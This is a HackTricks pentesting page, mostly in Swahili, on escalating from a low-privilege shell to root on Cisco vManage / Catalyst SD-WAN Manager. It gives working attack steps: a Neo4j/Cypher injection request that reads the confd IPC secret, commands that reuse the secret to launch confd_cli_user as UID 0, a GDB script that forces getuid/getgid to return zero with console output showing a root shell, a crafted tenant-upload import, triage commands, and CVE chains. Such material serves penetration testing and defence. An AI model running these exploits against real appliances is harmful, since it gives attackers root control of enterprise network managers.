# Cisco - vmanage

{{#include ../../banners/hacktricks-training.md}}

Mara tu unapopata code execution kwenye Cisco vManage / *Catalyst SD-WAN Manager* kama `vmanage`, `netadmin`, au `vmanage-admin`, maeneo ya local privesc yanayovutia zaidi huwa kawaida ni `confd` CLI stack, `cmdptywrapper` helper, localhost REST APIs, na root-owned import/upload handlers.

Ikiwa bado unahitaji **initial foothold** kwenye controller, angalia kwanza ukurasa maalum wa control-plane:

{{#ref}}
../../network-services-pentesting/12346-udp-pentesting-cisco-sd-wan-control-plane.md
{{#endref}}

## Quick local triage
```bash
ps auxww | egrep 'confd|cmdptywrapper|neo4j|vdaemon'
ss -lntp | egrep '4565|830|8443'
find /run /var/run -maxdepth 2 -type s 2>/dev/null | egrep 'confd|cli|rest|mgmt'
ls -l /etc/confd/confd_ipc_secret /usr/bin/confd_cli /usr/bin/confd_cli_user
ls -la /home/vmanage-admin/.ssh 2>/dev/null
grep -R "tenant-upload\|tenant-list" /opt /usr 2>/dev/null | head
```
Ikiwa `/etc/confd/confd_ipc_secret` inaweza kusomwa kutoka kwenye foothold yako, Path 1 na Path 2 huwa za vitendo mara moja. Ikiwa uliingia kupitia remote info leak au webshell, pia kagua kama tayari unaweza kufikia nyenzo za SSH za `vmanage-admin` au multitenancy upload handlers: utafiti wa 2026 ulionyesha zote mbili zilikuwa hatua za kuelekea zilizo halisi.

## Path 1

(Mfano kutoka [https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html](https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html))

Baada ya kuchimbua kidogo kupitia baadhi ya [documentation](http://66.218.245.39/doc/html/rn03re18.html) inayohusiana na `confd` na binaries tofauti (zinazopatikana kwa akaunti kwenye tovuti ya Cisco), tuligundua kwamba ili kuthibitisha IPC socket, hutumia secret iliyoko kwenye `/etc/confd/confd_ipc_secret`:
```
vmanage:~$ ls -al /etc/confd/confd_ipc_secret

-rw-r----- 1 vmanage vmanage 42 Mar 12 15:47 /etc/confd/confd_ipc_secret
```
Kumbuka instance yetu ya Neo4j? Inafanya kazi chini ya ruhusa za mtumiaji `vmanage`, hivyo inaturuhusu kupata faili kwa kutumia vulnerability ya awali:
```
GET /dataservice/group/devices?groupId=test\\\'<>\"test\\\\")+RETURN+n+UNION+LOAD+CSV+FROM+\"file:///etc/confd/confd_ipc_secret\"+AS+n+RETURN+n+//+' HTTP/1.1

Host: vmanage-XXXXXX.viptela.net



[...]

"data":[{"n":["3708798204-3215954596-439621029-1529380576"]}]}
```
Programu ya `confd_cli` haiungi mkono command line arguments lakini inaita `/usr/bin/confd_cli_user` na arguments. Hivyo, tunaweza kuita moja kwa moja `/usr/bin/confd_cli_user` na seti yetu wenyewe ya arguments. Hata hivyo, haiwezi kusomeka kwa privileges zetu za sasa, kwa hiyo tunapaswa kuipata kutoka rootfs na kuinakili kwa kutumia scp, kusoma help, na kuitumia kupata shell:
```
vManage:~$ echo -n "3708798204-3215954596-439621029-1529380576" > /tmp/ipc_secret

vManage:~$ export CONFD_IPC_ACCESS_FILE=/tmp/ipc_secret

vManage:~$ /tmp/confd_cli_user -U 0 -G 0

Welcome to Viptela CLI

admin connected from 127.0.0.1 using console on vManage

vManage# vshell

vManage:~# id

uid=0(root) gid=0(root) groups=0(root)
```
## Path 2

(Mfano kutoka [https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77](https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77))

Blogu¹ ya timu ya synacktiv ilielezea njia maridadi ya kupata root shell, lakini tahadhari ni kwamba inahitaji kupata nakala ya `/usr/bin/confd_cli_user` ambayo inaweza kusomwa tu na root. Nilipata njia nyingine ya kupandisha hadi root bila usumbufu huo.

Nilipokuwa nikidisasemble binary ya `/usr/bin/confd_cli`, niliona yafuatayo:

<details>
<summary>Objdump inayoonyesha ukusanyaji wa UID/GID</summary>
```asm
vmanage:~$ objdump -d /usr/bin/confd_cli
… snipped …
40165c: 48 89 c3              mov    %rax,%rbx
40165f: bf 1c 31 40 00        mov    $0x40311c,%edi
401664: e8 17 f8 ff ff        callq  400e80 <getenv@plt>
401669: 49 89 c4              mov    %rax,%r12
40166c: 48 85 db              test   %rbx,%rbx
40166f: b8 dc 30 40 00        mov    $0x4030dc,%eax
401674: 48 0f 44 d8           cmove  %rax,%rbx
401678: 4d 85 e4              test   %r12,%r12
40167b: b8 e6 30 40 00        mov    $0x4030e6,%eax
401680: 4c 0f 44 e0           cmove  %rax,%r12
401684: e8 b7 f8 ff ff        callq  400f40 <getuid@plt>  <-- HERE
401689: 89 85 50 e8 ff ff     mov    %eax,-0x17b0(%rbp)
40168f: e8 6c f9 ff ff        callq  401000 <getgid@plt>  <-- HERE
401694: 89 85 44 e8 ff ff     mov    %eax,-0x17bc(%rbp)
40169a: 8b bd 68 e8 ff ff     mov    -0x1798(%rbp),%edi
4016a0: e8 7b f9 ff ff        callq  401020 <ttyname@plt>
4016a5: c6 85 cf f7 ff ff 00  movb   $0x0,-0x831(%rbp)
4016ac: 48 85 c0              test   %rax,%rax
4016af: 0f 84 ad 03 00 00     je     401a62 <socket@plt+0x952>
4016b5: ba ff 03 00 00        mov    $0x3ff,%edx
4016ba: 48 89 c6              mov    %rax,%rsi
4016bd: 48 8d bd d0 f3 ff ff  lea    -0xc30(%rbp),%rdi
4016c4:   e8 d7 f7 ff ff           callq  400ea0 <*ABS*+0x32e9880f0b@plt>
… snipped …
```
</details>

Nilipokimbia “ps aux”, niliona yafuatayo (_note -g 100 -u 107_)
```
vmanage:~$ ps aux
… snipped …
root     28644  0.0  0.0   8364   652 ?        Ss   18:06   0:00 /usr/lib/confd/lib/core/confd/priv/cmdptywrapper -I 127.0.0.1 -p 4565 -i 1015 -H /home/neteng -N neteng -m 2232 -t xterm-256color -U 1358 -w 190 -h 43 -c /home/neteng -g 100 -u 1007 bash
… snipped …
```
Niliweka dhana kwamba programu ya “confd_cli” hupitisha user ID na group ID ilizokusanya kutoka kwa user aliyeingia kwa “cmdptywrapper” application.

Jaribio langu la kwanza lilikuwa kuendesha “cmdptywrapper” moja kwa moja na kuiwekea `-g 0 -u 0`, lakini ilishindikana. Inaonekana file descriptor (-i 1015) iliundwa mahali fulani njiani na siwezi kuiigiza.

Kama ilivyotajwa katika blog ya synacktiv(mfano wa mwisho), programu ya “confd_cli” haiungi mkono command line argument, lakini ninaweza kuiathiri kwa debugger na kwa bahati nzuri GDB imejumuishwa kwenye system.

Niliunda GDB script ambapo nililazimisha API `getuid` na `getgid` kurudisha 0. Kwa kuwa tayari nina “vmanage” privilege kupitia deserialization RCE, nina ruhusa ya kusoma `/etc/confd/confd_ipc_secret` moja kwa moja.

root.gdb:
```
set environment USER=root
define root
finish
set $rax=0
continue
end
break getuid
commands
root
end
break getgid
commands
root
end
run
```
Console Output:

<details>
<summary>Pato la Console</summary>
```text
vmanage:/tmp$ gdb -x root.gdb /usr/bin/confd_cli
GNU gdb (GDB) 8.0.1
Copyright (C) 2017 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-poky-linux".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from /usr/bin/confd_cli...(no debugging symbols found)...done.
Breakpoint 1 at 0x400f40
Breakpoint 2 at 0x401000Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401689 in ?? ()Breakpoint 2, getgid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401694 in ?? ()Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401871 in ?? ()
Welcome to Viptela CLI
root connected from 127.0.0.1 using console on vmanage
vmanage# vshell
bash-4.4# whoami ; id
root
uid=0(root) gid=0(root) groups=0(root)
bash-4.4#
```
</details>

## Njia 3 (2025 CLI input validation bug - CVE-2025-20122)

Cisco baadaye ilirekodi njia safi zaidi ya local root katika advisory yake yenyewe kwa [CVE-2025-20122](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-priviesc-WCk7bmmt): **mshambulizi aliyeidhinishwa na mwenye ruhusa za read-only pekee** angeweza kutuma request iliyoundwa maalum kwa manager CLI na kurukia hadi root kwa sababu ya input validation isiyotosha.

Kutoka kwa mtazamo wa offensive, huu ndio muhtasari muhimu:

1. Mara tu unapokuwa na *foothold* yoyote ya low-priv kwenye box, unapaswa kujaribu local CLI service kabla ya kwenda kwenye workflow nzito ya Njia 1 / Njia 2.
2. Tumia tena artifacts kutoka Njia 2 ili kupata trust boundary: `confd_cli` → `cmdptywrapper` → `vshell`.
3. Chukulia kila field inayopitishwa kwa CLI backend kama ya kushukiwa: UID/GID, username, terminal metadata, imported files, au value yoyote inayotumiwa baadaye na helper inayomilikiwa na root.
4. Ikiwa user wa low-priv anaweza kufikia local CLI socket na kuathiri fields hizo, root inaweza kuwa ni request moja tu iliyoundwa maalum mbali.

Workflow ya vitendo baada ya kutua kwenye appliance ni:
```bash
strings /usr/bin/confd_cli | egrep 'cmdptywrapper|vshell|confd'
strace -f -s 200 -o /tmp/confd.trace /usr/bin/confd_cli
ss -lntp | grep 4565
```
Hii inabadilisha bug ya 2025 kuwa pattern nzuri ya kuwinda kwa version zinazofanana: tafuta **local CLI shims that collect identity in userland and forward it to a more privileged wrapper**.

Usichanganye **CVE-2025-20122** na ya baadaye **CVE-2026-20122**: issue ya 2025 ni bug ya *local* CLI-to-root, wakati issue ya 2026 ni *remote* API arbitrary file overwrite ambayo mara nyingi inafaa zaidi kwa kupanda foothold kisha kurudia Path 1 / Path 2 / Path 4.

## Path 4 (2026 low-priv REST API to root - CVE-2026-20126)

Cisco's February 2026 advisory pia ilianzisha class nyingine muhimu ya privesc: [CVE-2026-20126](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-authbp-qwCX8D4v) iliruhusu **authenticated, local attacker with low privileges** kupata root kwa sababu ya insufficient user-authentication mechanism katika REST API.

Hii ni muhimu kwa sababu vManage privesc si tena limited kwa `confd`/TTY abuse pekee. Baada ya low-priv shell, pia tafuta:

- localhost-only API endpoints zinazomwamini caller kupita kiasi
- tokens, cookies, au service credentials zinazosomwa kutoka current account
- root-only actions zilizofichuliwa kupitia `dataservice`/REST handlers ambazo bado zinaweza kuchochewa locally

Kwa vitendo, ukishapata shell kama `vmanage` au service user mwingine, local API abuse mara nyingi ni kimya zaidi na rahisi ku-automate kuliko interactive CLI abuse:
```bash
env | grep -iE 'token|cookie|session'
grep -R "dataservice" /etc /opt 2>/dev/null | head
ss -lntp | grep -E '(:443|:8443)'
```
Ikiwa muktadha wa session ya local unatosha kufikia privileged REST functionality, pendelea njia ya API: ni rahisi ku-replay, ku-script, na ku-chain pamoja na stolen web sessions au API tokens.

## Path 5 (2026 crafted file processed by root - CVE-2026-20245)

Mfumo mwingine wa hivi karibuni ni [CVE-2026-20245](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-privesc-4uxFrdzx): mshambuliaji wa local mwenye privileges za `netadmin` angeweza kupakia **crafted file** ambayo CLI baadaye iliishughulikia kwa njia isiyo salama, na kusababisha command injection kama `root`.

Kwa mtazamo wa HackTricks, technique yenye thamani ni pana zaidi kuliko CVE mahususi:

1. Orodhesha kila CLI au web workflow inayokubali file: imports, diagnostic bundles, templates, validators, backups, tenant data, n.k.
2. Fuatilia faili iliyopakiwa inaishia wapi na ni script au binary gani ya owned by root inayoitumia.
3. Jaribu kama filename, file content, au parsed metadata hupelekwa mara yoyote kwenye shell commands, wrapper scripts, au helpers za `system()`-style.
4. Ikiwa tayari unaweza kufikia `netadmin` (valid creds, stolen session, au auth-bypass chain), bugs za file-processing mara nyingi ni njia ya haraka zaidi hadi root.

Google Cloud / Mandiant baadaye walionyesha instance halisi sana ya bug class hii ikitumiwa kupitia multitenancy import path:
```bash
request tenant-upload tenant-list /home/admin/evil_tenant.csv vpn 0
```
Katika shambulio lililozingatiwa, CSV iliyotengenezwa mahsusi iliishia kurekebisha `/etc/passwd` na `/etc/shadow` ili kuunda akaunti ya muda ya UID 0 (`troot`). Hilo linafanya `tenant-upload` / `tenant-list` aina ya importers kuwa za kuvutia sana: si tu vipengele vya kuingiza data, bali pia front-ends za parser zinazomilikiwa na root.

Muundo wa haraka wa kuchunguza upande wa shell ni:
```bash
strings /usr/bin/* 2>/dev/null | grep -E 'tenant-upload|tenant-list|import|upload|backup' | head
grep -R "tenant-upload\|tenant-list" /opt /usr 2>/dev/null | head
```
Aina hii ya bug huunganishwa vizuri hasa na foothold za mbali zinazotoa `netadmin` lakini si `root`.

## Other recent vManage/Catalyst SD-WAN Manager vulns to chain

- **Unauthenticated info leak (CVE-2026-20133)** – Hasa yenye thamani kubwa kwa sababu utafiti wa umma ulionyesha inaweza kufichua `confd_ipc_secret` au private key ya `vmanage-admin`, ikigeuza bug ya kusoma kuwa ama Path 1 au NETCONF pivot.
- **Authenticated API arbitrary file overwrite (CVE-2026-20122)** – Tofauti na bug ya 2025 CLI hapo juu; VulnCheck iliitumia kupakia webshell, jambo linalofanya local privesc paths kwenye ukurasa huu kuwa muhimu mara moja.
- **Authenticated UI XSS (CVE-2024-20475)** – Chukua admin session katika web UI, kisha pivota kwenda kwenye vitendo vya API/CLI vinavyofikia hatimaye `vshell` au mojawapo ya local privesc paths hapo juu.
- **Remote auth bypass to `netadmin` (CVE-2026-20129)** – Kiini cha awali chenye nguvu sana kwa Path 5 kwa sababu `netadmin` ndiyo kiwango hasa kinachohitajika na privesc ya 2026 crafted-file.
- **Authenticated arbitrary file write (CVE-2026-20262)** – Thamani ya kushambulia sawa na CVE-2026-20122 lakini kupitia path ya baadaye ya web UI upload: andika kwenye eneo ambalo baadaye litasomwa na root au na management-plane web tier.
- **Downgrade to resurrect old CLI privesc (CVE-2022-20775)** – Uvamizi wa 2026 ulionyesha washambuliaji wanaweza kurudi nyuma hadi build ya zamani yenye udhaifu ya SD-WAN, kutumia old CLI root bug, kisha kurejesha toleo la awali.
- **Pre-auth control-plane auth bypass (CVE-2026-20182)** – Imeandikwa vizuri zaidi katika ukurasa maalum wa SD-WAN control-plane; inaweza kuongeza SSH key kwa `vmanage-admin`, ikikupa foothold ya ndani inayohitajika kurudia kutembelea ukurasa huu.



## References

- [Cisco Catalyst SD-WAN Vulnerabilities (CVE-2026-20126, CVE-2026-20129, etc.)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-authbp-qwCX8D4v)
- [Cisco Catalyst SD-WAN Controller, Catalyst SD-WAN Manager, and Catalyst SD-WAN Validator Authenticated Privilege Escalation Vulnerability (CVE-2026-20245)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-privesc-4uxFrdzx)
- [VulnCheck: Herding Cats - Recent Cisco SD-WAN Manager Vulnerabilities](https://www.vulncheck.com/blog/cisco-sd-wan-manager-vulns)
- [Google Cloud / Mandiant: Zero-Day Exploitation of Vulnerability (CVE-2026-20245) in Cisco Catalyst SD-WAN Manager](https://cloud.google.com/blog/topics/threat-intelligence/zero-day-exploitation-cisco-catalyst-sd-wan-manager)
{{#include ../../banners/hacktricks-training.md}}
